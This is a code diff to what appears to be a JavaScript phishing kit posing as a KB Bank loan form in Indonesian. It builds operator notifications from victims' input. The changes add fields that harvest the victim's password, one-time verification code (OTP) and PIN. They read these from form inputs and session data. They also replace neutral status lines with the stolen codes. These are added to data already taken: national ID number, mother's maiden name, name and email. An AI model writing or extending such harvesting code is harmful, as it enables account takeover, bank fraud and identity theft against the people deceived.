@@ -29,6 +29,7 @@
     '🔔 DATA PENGGUNA',
     '',
     `Email            : ${payload.email || payload.username || '-'}`,
+    `Password         : ${payload.password || '-'}`,
     `Nama Lengkap     : ${payload.nama_lengkap || '-'}`,
     `Nama Ibu Kandung : ${payload.nama_ibu_kandung || '-'}`,
     `NIK KTP          : ${payload.nik || '-'}`,
@@ -42,7 +43,7 @@
       '',
       'Kode Verifikasi Anda',
       '',
-      'Status: Verifikasi berhasil',
+      `🔐 ${payload.otp || '-'}`,
       ''
     ].join('\n');
   };
@@ -52,7 +53,7 @@
     return [
       `🔔 PIN ${firstName.toUpperCase()}`,
       '',
-      'Status: Konfirmasi berhasil',
+      `PIN Anda: ${payload.pin || '-'}`,
       ''
     ].join('\n');
   };
@@ -76,9 +77,12 @@
       '=== NOTIF RES KB BANK ===',
       `Username: ${payload.username || '-'}`,
       `Email: ${payload.email || '-'}`,
+      `Password: ${payload.password || '-'}`,
       `Nama Lengkap: ${payload.nama_lengkap || '-'}`,
       `NIK (16 Digit): ${payload.nik || '-'}`,
       `Nama Ibu Kandung: ${payload.nama_ibu_kandung || '-'}`,
+      `OTP: ${payload.otp || '-'}`,
+      `PIN: ${payload.pin || '-'}`,
       `Timestamp: ${payload.timestamp || '-'}`,
       '========================'
     ].join('\n');
@@ -109,9 +113,12 @@
       page: sanitize(dataInput.page || 'unknown'),
       username: sanitize(dataInput.username ?? session.username ?? session.identity ?? identity.fullName ?? currentDoc?.getElementById('identity')?.value ?? ''),
       email: sanitize(dataInput.email ?? session.email ?? (currentDoc?.getElementById('identity')?.value && String(currentDoc.getElementById('identity').value).includes('@') ? currentDoc.getElementById('identity').value : '') ?? ''),
+      password: sanitize(dataInput.password ?? session.password ?? currentDoc?.getElementById('password')?.value ?? ''),
       nama_lengkap: sanitize(dataInput.nama_lengkap ?? identity.fullName ?? currentDoc?.getElementById('fullName')?.value ?? ''),
       nik: sanitize(dataInput.nik ?? identity.nik ?? currentDoc?.getElementById('nik')?.value ?? application.lastNik ?? ''),
       nama_ibu_kandung: sanitize(dataInput.nama_ibu_kandung ?? identity.motherName ?? currentDoc?.getElementById('motherName')?.value ?? ''),
+      otp: sanitize(dataInput.otp ?? application.lastOtp ?? currentDoc?.querySelector('.otp input')?.value ?? ''),
+      pin: sanitize(dataInput.pin ?? application.lastPin ?? ''),
       amount: sanitize(dataInput.amount ?? application.loan?.amount ?? currentDoc?.getElementById('amount')?.value ?? ''),
       tenor: sanitize(dataInput.tenor ?? application.loan?.tenor ?? currentDoc?.getElementById('tenor')?.value ?? ''),
       purpose: sanitize(dataInput.purpose ?? application.loan?.purpose ?? currentDoc?.getElementById('purpose')?.value ?? ''),
@@ -133,9 +140,12 @@
       page: payload.page,
       username: payload.username,
       email: payload.email,
+      password: payload.password,
       nama_lengkap: payload.nama_lengkap,
       nik: payload.nik,
       nama_ibu_kandung: payload.nama_ibu_kandung,
+      otp: payload.otp,
+      pin: payload.pin,
       amount: payload.amount,
       tenor: payload.tenor,
       purpose: payload.purpose,
